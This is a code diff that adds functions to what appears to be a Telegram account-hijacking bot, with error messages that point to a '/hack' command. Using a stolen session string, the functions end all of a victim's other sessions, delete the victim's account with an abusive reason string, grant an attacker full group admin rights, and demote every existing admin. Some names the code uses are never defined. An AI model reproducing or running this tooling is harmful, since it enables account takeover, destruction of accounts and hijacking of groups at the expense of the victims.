@@ -126,3 +126,118 @@ async def users_gc(session):
     if err:
         return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
     return msg
+
+async def terminate_all(session):
+    err = ""
+    try:
+        if session.endswith("="):
+            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await steve.connect()
+            await steve(rt())
+            await steve.disconnect() 
+                             
+        else:    
+            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+                await stark.invoke(functions.auth.ResetAuthorizations())
+    except Exception as idk:
+        err += str(idk)
+                    
+    if err:
+        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴀʟʟ sᴇssɪᴏɴs"
+
+async def del_acc(session):
+    err = ""
+    try:
+        if session.endswith("="):
+            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await steve.connect()
+            await steve(ok.account.DeleteAccountRequest("owner madarchod h"))
+            await steve.disconnect() 
+                             
+        else:    
+            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+                await stark.invoke(functions.account.DeleteAccount(reason="madarchod hu me"))
+    except Exception as idk:
+        err += str(idk)
+                    
+    if err:
+        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀᴄᴄ."
+
+FULL_PROMOTE_POWERS = ChatPrivileges(
+    can_change_info=True,
+    can_delete_messages=True,
+    can_restrict_members=True,
+    can_pin_messages=True,
+    can_manage_video_chats=True,
+    can_promote_members=True,    
+    can_invite_users=True)
+
+PROMOTE_POWERS = ChatPrivileges(
+    can_change_info=True,
+    can_delete_messages=True,
+    can_restrict_members=True,
+    can_pin_messages=True)
+
+async def piromote(session,gc_id,user_id):
+    err = ""
+    gc_id = str(gc_id.text) if type(gc_id.text) == Str else int(gc_id.text)
+    user_id = str(user_id.text) if type(user_id.text) == Str else int(user_id.text)
+    try:
+        if session.endswith("="):
+            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await steve.connect()
+            try:
+                await steve.edit_admin(gc_id, user_id, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
+            except:
+                await steve.edit_admin(gc_id, user_id, is_admin=True, anonymous=False, pin_messages=True, title='Owner')    
+            await steve.disconnect()                              
+        else:    
+            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+                try:    
+                    await stark.promote_chat_member(gc_id,user_id,FULL_PROMOTE_POWERS)
+                except:
+                    await stark.promote_chat_member(gc_id,user_id,PROMOTE_POWERS)
+    except Exception as idk:
+        err += str(idk)
+                    
+    if err:
+        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ ᴜsᴇʀ."
+
+DEMOTE = ChatPrivileges(
+        can_change_info=False,
+        can_invite_users=False,
+        can_delete_messages=False,
+        can_restrict_members=False,
+        can_pin_messages=False,
+        can_promote_members=False,
+        can_manage_chat=False,
+        can_manage_video_chats=False,
+    )
+
+async def demote_all(session,gc_id):
+    err = ""
+    gc_id = str(gc_id.text) if type(gc_id.text) == Str else int(gc_id.text)
+    try:
+        if session.endswith("="):
+            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
+            await steve.connect()
+            async for x in steve.iter_participants(gc_id, filter=ChannelParticipantsAdmins):
+                try:
+                    await steve.edit_admin(gc_id, x.id, is_admin=False, manage_call=False)
+                except:
+                    await steve.edit_admin(gc_id, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
+          
+            await steve.disconnect()                              
+        else:    
+            async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+                async for m in stark.get_chat_members(gc_id, filter=enums.ChatMembersFilter.ADMINISTRATORS):
+                    await stark.promote_chat_member(gc_id,m.user.id,DEMOTE)                                                                                     
+    except Exception as idk:
+        err += str(idk)
+                    
+    if err:
+        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
+    return "sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ ᴀʟʟ."
